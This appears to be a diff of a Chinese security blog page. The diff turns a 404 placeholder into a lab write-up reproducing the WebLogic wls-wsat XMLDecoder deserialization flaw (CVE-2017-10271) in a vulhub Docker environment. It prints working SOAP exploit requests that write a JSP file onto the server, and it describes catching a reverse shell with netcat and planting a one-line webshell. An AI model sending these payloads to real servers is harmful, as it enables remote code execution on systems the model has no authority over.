@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="苏御">
+    <meta name="keywords" content="Weblogic &lt; 10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271）, 苏御">
     <meta name="description" content="11">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>苏御</title>
+    <title>Weblogic &lt; 10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271） | 苏御</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">Weblogic &lt; 10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1>
                 </div>
             </div>
         </div>
@@ -333,12 +333,33 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
+                            </a>
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                漏洞复现
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -347,28 +368,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-17
+                    2020-07-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-08
+                    2020-08-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    21
+                    480
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -383,10 +404,58 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                title: 404
-type: "404"
-layout: "404"
-description: "Oops～，我崩溃了！找不到你想要的页面 :("
+                <p>1.漏洞介绍<br>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
+<p>2.漏洞环境<br> 通过vulhub进行搭建，找到我们要复现的漏洞的文件夹  docker-compose up -d 如图就搭建好了<br> <img src="https://img-blog.csdnimg.cn/20200804161627803.jpg" alt><br> <img src="https://img-blog.csdnimg.cn/20200811175220839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br><img src="https://img-blog.csdnimg.cn/20200811175232387.png" alt></p>
+<p>3.漏洞复现<br>方法一：<br>1.直接发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）</p>
+<pre class=" language-python"><code class="language-python">POST <span class="token operator">/</span>wls<span class="token operator">-</span>wsat<span class="token operator">/</span>CoordinatorPortType HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+Host<span class="token punctuation">:</span> your<span class="token operator">-</span>ip<span class="token punctuation">:</span><span class="token number">7001</span>
+Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
+Accept<span class="token punctuation">:</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span>
+Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> en
+User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE <span class="token number">9.0</span><span class="token punctuation">;</span> Windows NT <span class="token number">6.1</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> Trident<span class="token operator">/</span><span class="token number">5.0</span><span class="token punctuation">)</span>
+Connection<span class="token punctuation">:</span> close
+Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>xml
+Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">638</span>
+
+<span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Envelope xmlns<span class="token punctuation">:</span>soapenv<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>
+    <span class="token operator">&lt;</span>work<span class="token punctuation">:</span>WorkContext xmlns<span class="token punctuation">:</span>work<span class="token operator">=</span><span class="token string">"http://bea.com/2004/06/soap/workarea/"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>java<span class="token operator">></span><span class="token operator">&lt;</span>java version<span class="token operator">=</span><span class="token string">"1.4.0"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.beans.XMLDecoder"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>object <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.io.PrintWriter"</span><span class="token operator">></span> 
+    <span class="token operator">&lt;</span>string<span class="token operator">></span>servers<span class="token operator">/</span>AdminServer<span class="token operator">/</span>tmp<span class="token operator">/</span>_WL_internal<span class="token operator">/</span>bea_wls_internal<span class="token operator">/</span>9j4dqk<span class="token operator">/</span>war<span class="token operator">/</span>test<span class="token punctuation">.</span>jsp<span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>
+    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"println"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>
+    <span class="token operator">&lt;</span>!<span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>
+<span class="token operator">&lt;</span><span class="token operator">%</span> out<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>
+    <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>void<span class="token operator">></span>
+    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"close"</span><span class="token operator">/</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>object<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>work<span class="token punctuation">:</span>WorkContext<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>
+    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Body<span class="token operator">/</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Envelope<span class="token operator">></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20200811175248587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br>2.用nc监听我们数据包中设置的端口 nc -l -p 21,当数据包发送成功会发现我们收到一个shell。<br><img src="https://img-blog.csdnimg.cn/20200804161929275.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt><br> 3.另一种方法，我们同样可以发包去写一个带有一句话木马文件getshell。</p>
+<pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Envelope xmlns<span class="token punctuation">:</span>soapenv<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>
+    <span class="token operator">&lt;</span>work<span class="token punctuation">:</span>WorkContext xmlns<span class="token punctuation">:</span>work<span class="token operator">=</span><span class="token string">"http://bea.com/2004/06/soap/workarea/"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>java<span class="token operator">></span><span class="token operator">&lt;</span>java version<span class="token operator">=</span><span class="token string">"1.4.0"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.beans.XMLDecoder"</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span>object <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"java.io.PrintWriter"</span><span class="token operator">></span> 
+    <span class="token operator">&lt;</span>string<span class="token operator">></span>servers<span class="token operator">/</span>AdminServer<span class="token operator">/</span>tmp<span class="token operator">/</span>_WL_internal<span class="token operator">/</span>bea_wls_internal<span class="token operator">/</span>9j4dqk<span class="token operator">/</span>war<span class="token operator">/</span>test<span class="token punctuation">.</span>jsp<span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>
+    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"println"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>
+    <span class="token operator">&lt;</span>!<span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span>
+<span class="token operator">&lt;</span><span class="token operator">%</span> out<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"CVE-2017-10271-"</span><span class="token operator">+</span><span class="token punctuation">{</span>date<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span>
+    <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>string<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>void<span class="token operator">></span>
+    <span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"close"</span><span class="token operator">/</span><span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>object<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>java<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>work<span class="token punctuation">:</span>WorkContext<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Header<span class="token operator">></span>
+    <span class="token operator">&lt;</span>soapenv<span class="token punctuation">:</span>Body<span class="token operator">/</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>soapenv<span class="token punctuation">:</span>Envelope<span class="token operator">></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20200811175248587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt>4.为了演示这里我写了一个test.jsp 内容写了test发包访问目标网站，成功输出内容。<br><img src="https://img-blog.csdnimg.cn/20200811175318429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3MxMDU2NDgxNDMy,size_16,color_FFFFFF,t_70" alt></p>
+
             </div>
             <hr/>
 
@@ -411,7 +480,7 @@ description: "Oops～，我崩溃了！找不到你想要的页面 :("
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://hatjwe.github.io/404.html">http://hatjwe.github.io/404.html</a>
+                    <a href="http://hatjwe.github.io/2020/07/30/aricle4/">http://hatjwe.github.io/2020/07/30/aricle4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -448,7 +517,15 @@ description: "Oops～，我崩溃了！找不到你想要的页面 :("
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
+                                </a>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -665,31 +742,37 @@ description: "Oops～，我崩溃了！找不到你想要的页面 :("
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/404.html">
+                <a href="/2020/07/30/aricle4/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Weblogic &lt; 10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271）">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Weblogic &lt; 10.3.6 &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞（CVE-2017-10271）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            title: 404
-type: "404"
-layout: "404"
-description: "Oops～，我崩溃了！找不到你想要的页面 :("
+                            1.漏洞介绍Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。
+2.漏洞环境 通过vulhub进行搭
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-30
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
                             
                             
                         </span>
@@ -697,46 +780,75 @@ description: "Oops～，我崩溃了！找不到你想要的页面 :("
                 </div>
 
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/404.html">
+                <a href="/2020/07/28/article3/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            title: 404
-type: "404"
-layout: "404"
-description: "Oops～，我崩溃了！找不到你想要的页面 :("
+                            漏洞介绍
+Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
